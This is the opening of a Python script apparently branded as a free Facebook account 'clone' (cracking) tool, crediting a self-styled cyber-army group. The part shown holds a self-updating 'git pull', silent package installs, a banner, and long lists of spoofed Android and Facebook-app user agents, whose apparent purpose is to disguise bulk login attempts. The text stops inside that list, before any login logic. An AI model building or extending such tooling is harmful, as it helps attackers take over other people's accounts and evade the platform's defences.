#KING OF KING
import os,sys,time,json,random,re,string,platform,base64,uuid
os.system("git pull")
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')

RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' 
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
P = '\x1b[1;97m' 
M = '\x1b[1;91m' 
H = '\x1b[1;92m' 
K = '\x1b[1;93m' 
B = '\x1b[1;94m' 
U = '\x1b[1;95m' 
O = '\x1b[1;96m' 
N = '\x1b[0m'    
A = '\x1b[1;90m' 
BN = '\x1b[1;107m' 
BBL = '\x1b[1;106m' 
BP = '\x1b[1;105m' 
BB = '\x1b[1;104m' 
BK = '\x1b[1;103m' 
BH = '\x1b[1;102m' 
BM = '\x1b[1;101m' 
BA = '\x1b[1;100m' 
#____________Timedate_____________
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today() 

logo =("""\033[1;32m 
 __      __.__    .__  __           ________              .__.__   
/  \    /  \  |__ |__|/  |_  ____   \______ \   _______  _|__|  |  
\   \/\/   /  |  \|  \   __\/ __ \   |    |  \_/ __ \  \/ /  |  |  
 \        /|   Y  \  ||  | \  ___/   |    `   \  ___/\   /|  |  |__
  \__/\  / |___|  /__||__|  \___  > /_______  /\___  >\_/ |__|____/
       \/       \/              \/          \/     \/              
 ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
 ┃ [🔰]AUTHOR    \033[1;32m: \033[1;92m亗HR♤HREDOY࿐                      ┃
 ┃ [🔰]TOOL      \033[1;32m: \033[1;92mRANDOM CLONE                             ┃
 ┃ [🔰]STATUS    \033[1;32m: \033[1;92mFREE                                                ┃
 ┃ [🔰]SYSTEM    \033[1;32m: \033[1;92mDATA ÷ WIFI                                  ┃
 ┃ [🔰]GITHUB    \033[1;32m: \033[1;92m@WHITE-DEVIL-CYBER-ARMY.   ┃
 ┃ [🔰]FACEBOOK  \033[1;32m: \033[1;92mHR　H　R　E　D　O　 Y　ツ  ┃
 ┃ [🔰]WHATSAPP  \033[1;32m: \033[1;92m+966591757955   ┃
 ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛""")
loop = 0
oks = []
cps = []
 
def clear():
    os.system('clear')
    print(logo)
from time import localtime as lt
from os import system as cmd
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
    
    
try:
    print('\n\n\033[1;33mLoading asset files ... \033[0;97m')
    v = 5.2
    update = ('5.2')
    update = ('5.2')
    if str(v) in update:
        os.system('clear')
    else:pass
except:print('\n\033[1;31mNo internet connection ... \033[0;97m')
#global functions
def dynamic(text):
    titik = ['.   ','..  ','... ','.... ']
    for o in titik:
        print('\r'+text+o),
        sys.stdout.flush();time.sleep(1)
 
#User agents
ugen2=[]
ugen=[]
for agent in range(10000):
        aa='Mozilla/5.0 (Linux; Android 10; moto g(8) play Build/QMDS30.47-33-5; wv)'
        b=random.choice(['6','7','8','9','10','11','12'])
        c='Android 10; moto g(8) play Build/'
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.randrange(1, 999)
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/348.0.0.8.103;]'
        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
        ugen.append(fullagnt)  
ugen=[]
ugen=["Mozilla/5.0 (Linux; Android 10; SAMSUNG SM-A715F/A715FXXU3ATK1) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/20.0 Chrome/106.0.5249.126 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; ANE-LX3 Build/HUAWEIANE-L03; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]",
"Mozilla/5.0 (Linux; Android 13; SM-S901B Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 GNews Android/2022120648",
"Mozilla/5.0 (Linux; Android 7.0; BAH-W09 Build/HUAWEIBAH-W09) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Safari/537.36 GNews Android/2022120648",
"Mozilla/5.0 (Linux; Android 12; SM-A135F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]",
"Mozilla/5.0 (Linux; Android 12; SM-F721B Build/SP2A.220305.013; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]",
"Mozilla/5.0 (Linux; Android 11; SM-G780F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]",
"Mozilla/5.0 (Linux; Android 13; CPH2247 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]",
"Mozilla/5.0 (Linux; Android 13; RMX3370 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.75 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]",
"Mozilla/5.0 (iPhone; CPU iPhone OS 16_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20D67 [FBAN/FBIOS;FBDV/iPhone11,8;FBMD/iPhone;FBSN/iOS;FBSV/16.3.1;FBSS/2;FBID/phone;FBLC/es_LA;FBOP/5]",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 [ip:46.123.243.71]",
"Mozilla/5.0 (Linux; U; Android 10; JNY-LX1 Build/HUAWEIJNY-L21; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.93 Mobile Safari/537.36 OPR/67.0.2254.64762",
"Mozilla/5.0 (Linux; Android 10; SM-A105FN Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.105 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/398.0.0.21.105;]",
"Mozilla/5.0 (Linux; Android 7.0; XTOUCH X10 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 13; SM-G980F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.5249.126 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]",
"Mozilla/5.0 (Linux; Android 10; LM-Q730 Build/QKQ1.200216.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]",
"Mozilla/5.0 (Linux; Android 12; CPH2089 Build/RKQ1.211103.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.117 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]",
"Mozilla/5.0 (Linux; Android 8.0.0; SAMSUNG-SM-G935A Build/R16NW; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]",
"Mozilla/5.0 (Linux; Android 7.1.2; Action-X3 Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 GNews Android/2022120648",
"Mozilla/5.0 (Linux; Android 13; CPH2363 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]",
"Mozilla/5.0 (Linux; Android 11; moto g(20) Build/RTAS31.68-66-2) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 GNews Android/2022120648",
"Mozilla/5.0 (iPhone; CPU iPhone OS 14_8_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 (4830829328)TuneIn Radio/25.1.0; iPhone13%2C1; iOS/16.1.1TuneIn Radio Pro/25.1.0; iPhone10%2C5; iOS/16.3.1AppleCoreMedia/1.0.0.21G419 (Macintosh; U; Intel Mac OS X 12_6_3; es_es)",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML%2C like Gecko) Chrome/104.0.5112.102 Safari/537.36iTunes/4.7.1 (Windows; N; Windows 10; 8664; EN; cp1252) SqueezeCenter%2C Squeezebox Server%2C Logitech Media Server/7.9.3/1597753178",
"Mozilla/5.0 (Linux; Android 12; M2101K7BNY Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 GNews Android/2022120648",
"Mozilla/5.0 (Linux; Android 10; CPH1931 Build/QKQ1.200209.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 GNews Android/2022091350",
"Mozilla/5.0 (Linux; Android 12; 21061119DG Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.75 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]",
"Mozilla/5.0 (Linux; Android 12; M2003J15SC Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 GNews Android/2022120648Lavf/57.58.101",
"Mozilla/5.0 (Linux; Android 13; CPH2343 Build/TP1A.220624.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]",
"Mozilla/5.0 (Linux; Android 6.0.1; MotoG3 Build/MPIS24.107-55-2-17; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.5249.126 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]",
"Mozilla/5.0 (Linux; Android 13; SM-A336B Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 GNews Android/2022120648",
"Mozilla/5.0 (Linux; Android 13; CPH2207 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]",
"Mozilla/5.0 (iPhone; CPU iPhone OS 16_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20D5024e [FBAN/FBIOS;FBDV/iPhone14,3;FBMD/iPhone;FBSN/iOS;FBSV/16.3;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5]",
"Mozilla/5.0 (Linux; Android 11; 220333QNY Build/RKQ1.211001.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]",
"Mozilla/5.0 (Linux; Android 10; CPH2179 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]",
"Mozilla/5.0 (Linux; Android 13; SM-A715F Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 GNews Android/2022120648",
"Dalvik/2.1.0 (Linux; U; Android 12; motorola edge plus 5G UW (2022) Build/S3SHS32.12-41-4-4)",
"Mozilla/5.0 (iPad; CPU OS 15_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Safari/605.1.15 GNews iOS/5.70.100",
"Mozilla/5.0 (Linux; Android 10; SM-A107M Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.153 Mobile Safari/537.36 OPX/1.9",
"Mozilla/5.0 (Linux; Android 10; SM-N960F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]",
"Mozilla/5.0 (Linux; Android 7.0; HUAWEI MLA-L11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36 [ip:5.90.136.139]",
"Mozilla/5.0 (Linux; Android 12; RMX3491 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 GNews Android/2022120648",
"Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/111.0 [ip:151.75.250.157]",
"Mozilla/5.0 (Linux; Android 12; HD1913) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/20.0 Chrome/106.0.5249.126 Mobile Safari/537.36 [ip:37.160.146.43]",
"Mozilla/5.0 (Linux; Android 12; CPH2091 Build/RKQ1.211103.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36",
"Mozilla/5.0 (iPad; CPU OS 12_5_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 (4312834448)iTunes/10.7 (Windows; (Build 9200)) AppleWebKit/536.27.1",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 [ip:169.150.206.172]",
"Mozilla/5.0 (Linux; Android 13; SM-A515F Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36 GNews Android/2022118446",
"Mozilla/5.0 (Linux; Android 11; 2201116PG Build/RKQ1.211001.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.118 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]",
"Mozilla/5.0 (iPhone; CPU iPhone OS 16_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 (4471174144)TuneIn Radio/25.0.0; iPhone12,5; iOS/16.0",
"Mozilla/5.0 (Linux; Android 13; CPH2211 Build/TP1A.220905.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 GNews Android/2022120648TuneIn Radio Pro/23.9.1; iPad7,6; iPadOS/16.2iTunes/10.2.2 (Macintosh; Intel Mac OS X 10.6.7) AppleWebKit/533.21.1",
"Mozilla/5.0 (Linux; Android 11; CPH2211 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]",
"Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20B82 [FBAN/FBIOS;FBDV/iPhone12,3;FBMD/iPhone;FBSN/iOS;FBSV/16.1;FBSS/3;FBID/phone;FBLC/pt_BR;FBOP/5]",
"Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5 Plus Build/OPM1.171019.019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]",
"Mozilla/5.0 (Linux; Android 11; SM-A127M Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.141 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]",
"Mozilla/5.0 (Linux; Android 10; Redmi Note 9 Pro Build/QKQ1.191215.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]",
"Mozilla/5.0 (Linux; Android 11; Redmi Note 8T Build/RKQ1.201004.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 GNews Android/2022120648",
"Mozilla/5.0 (Linux; Android 12; SM-M215F Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36 GNews Android/2022120648",
"Mozilla/5.0 (Linux; Android 12; SM-A536B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]",
"Mozilla/5.0 (Linux; Android 11; LE2123) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 11; SM-T725 Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]",
"Mozilla/5.0 (iPad; CPU OS 12_5_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 (4494251440)",
"Mozilla/5.0 (Linux; Android 13; CPH2339 Build/TP1A.220905.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 GNews Android/2022120648",
"Mozilla/5.0 (Linux; Android 11; SM-A202F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36 [ip:151.60.153.229",
"Mozilla/5.0 (Linux; Android 11; M2006C3LVG Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]",
"Mozilla/5.0 (Linux; Android 10; moto e(7) plus Build/QPZS30.30-Q3-38-69-12; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.127 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]",
"Mozilla/5.0 (Android 13; Mobile; rv:108.0) Gecko/108.0 Firefox/108.0 [ip:5.171.202.161]",
"Mozilla/5.0 (Linux; Android 10; YAL-L41 Build/HUAWEIYAL-L41; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]",
"Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36 [ip:151.38.225.192]",
"Mozilla/5.0 (Linux; Android 13; SM-A137F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/405.0.0.23.72;]",
"Mozilla/5.0 (Linux; Android 11; Cyber 8 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]",
"Mozilla/5.0 (Linux; Android 10; Mi 10 Build/QKQ1.191117.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.185 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/405.0.0.23.72;]",
"Mozilla/5.0 (Linux; Android 11; SM-A505FN Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/346.0.0.8.76;]",
"Mozilla/5.0 (Linux; Android 10; VOG-L29 Build/HUAWEIVOG-L29; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/343.0.0.37.117;]",
"Mozilla/5.0 (Linux; Android 12; 21091116UG Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]",
"Mozilla/5.0 (Linux; Android 12; SM-A025G Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]",
"Mozilla/5.0 (Linux; Android 12; SM-A315G Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 GNews Android/2022118446",
"Mozilla/5.0 (Linux; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.71 Safari/537.36 SRAF/3.5 HbbTV/1.2.1 (; Blaupunkt_UMC; LC-50; V4.72; v1.0; ); CE-HTML/1.0 FXM-U2FsdGVkX1+lSSHwtCoZBY2sswLd30rRZ6EmOXv5z0Vv3OLjoWKSuapRIKLnl5xQ-END",
"Mozilla/5.0 (Linux; Android 11; SM-M307FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36 [ip:109.118.90.83]",
"Mozilla/5.0 (Linux; Android 9; POT-LX1 Build/HUAWEIPOT-L21; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/75.0.3770.89 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/347.0.0.28.237;]",
"Mozilla/5.0 (Linux; Android 10; Redmi Note 9 Pro Build/QKQ1.191215.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/405.1.0.28.72;]",
"Mozilla/5.0 (Linux; Android 11; SM-A515F Build/RP1A.200720.012) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 GNews Android/2022120648",
"Mozilla/5.0 (Linux; Android 8.0.0; Hi9Air) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 [ip:93.44.83.8]",
"Mozilla/5.0 (Linux; Android 13; SM-M127F Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 GNews Android/2022118458",
"Mozilla/5.0 (Linux; Android 13; NE2213 Build/SKQ1.220617.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 GNews Android/2022120648",
"Mozilla/5.0 (Linux; Android 12; SM-A315G Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]",]    
ugen=[]
ugen=["Mozilla/5.0 (Linux; Android 7.1.2; LM-X210 Build/N2G47H; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]",
"Mozilla/5.0 (Linux; Android 13; SM-G781B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/346.0.0.8.76;]",
"Mozilla/5.0 (Linux; Android 13; SM-X200 Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Safari/537.36 GNews Android/2022120648",
"Mozilla/5.0 (Linux; Android 9; ANE-LX1; HMSCore 6.9.6.301; GMSCore 23.09.14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 HuaweiBrowser/13.0.3.301 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 13; CPH2195 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]",
"Mozilla/5.0 (Linux; Android 10; A7 Pro Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 GNews Android/2022120648",
"Mozilla/5.0 (Linux; Android 12; CPH2009 Build/RKQ1.211103.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 GNews Android/2022120648",
"Mozilla/5.0 (Linux; Android 11; SM-A405FN Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]",
"Mozilla/5.0 (Linux; Android 8.0.0; BAH2-W19 Build/HUAWEIBAH2-W19) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Safari/537.36 GNews Android/2022120648",
"Mozilla/5.0 (Linux; Android 10; Redmi Note 9 Pro Build/QKQ1.191215.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.117 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]",
"Mozilla/5.0 (Linux; Android 7.0; SM-T815 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Safari/537.36 GNews Android/2022120648",
"Mozilla/5.0 (Linux; Android 13; RMX3521 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 GNews Android/2022120648",
"Mozilla/5.0 (Linux; Android 13; SM-A336B Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.5249.126 Mobile Safari/537.36 GNews Android/2022095808",
"Mozilla/5.0 (Linux; Android 11; M2101K9G Build/RKQ1.201112.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.65 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]",
"Mozilla/5.0 (iPhone; CPU iPhone OS 12_5_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 (4863324784)",
"Mozilla/5.0 (Linux; Android 9; G8441 Build/47.2.A.11.228) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 GNews Android/2022120648",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 [ip:2.47.8.31]",
"Mozilla/5.0 (Linux; Android 10; CDY-NX9A; HMSCore 6.9.6.302) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 HuaweiBrowser/13.0.4.302 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; SM-A015M Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]",
"Mozilla/5.0 (Linux; Android 9; SM-J600GT Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/405.1.0.28.72;]",
